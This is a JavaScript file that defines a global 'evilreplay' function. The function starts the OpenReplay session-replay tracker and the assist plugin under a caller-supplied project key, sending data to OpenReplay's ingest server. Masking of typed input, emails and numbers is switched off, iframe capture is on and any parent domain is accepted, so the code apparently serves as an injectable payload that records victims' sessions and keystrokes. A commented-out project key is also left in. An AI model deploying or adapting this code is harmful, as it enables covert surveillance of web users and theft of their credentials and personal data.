import { tracker } from '@openreplay/tracker';
import trackerAssist from '@openreplay/tracker-assist';

window.evilreplay = function(key) {
  console.log("Initiating evilreplay...")
  tracker.configure({
    // projectKey: "OEeP7C6ysFPXP8mDI04T",
    projectKey: key,
    defaultInputMode: 0,
    revID: "",
    node_id: "__openreplay_id",
    session_token_key: "__openreplay_token",
    session_pageno_key: "__openreplay_pageno",
    session_reset_key: "__openreplay_reset",
    session_tabid_key: "__openreplay_tabid",
    local_uuid_key: "__openreplay_uuid",
    ingestPoint: "https://api.openreplay.com/ingest",
    resourceBaseHref: null,
    __is_snippet: false,
    __debug_report_edp: null,
    localStorage: null,
    sessionStorage: null,
    forceSingleTab: false,
    assistSocketHost: "",
    captureIFrames: true,
    obscureTextEmails: 0,
    obscureTextNumbers: 0,
    disableStringDict: false,
    crossdomain: {
        parentDomain: "*"
    },
    canvas: {
        disableCanvas: false,
        fixedCanvasScaling: false,
        __save_canvas_locally: false,
        useAnimationFrame: false
    },
    forceNgOff: false,
    inlineCss: 0,
    disableSprites: false
  });

  tracker.use(trackerAssist());
  tracker.start();
}


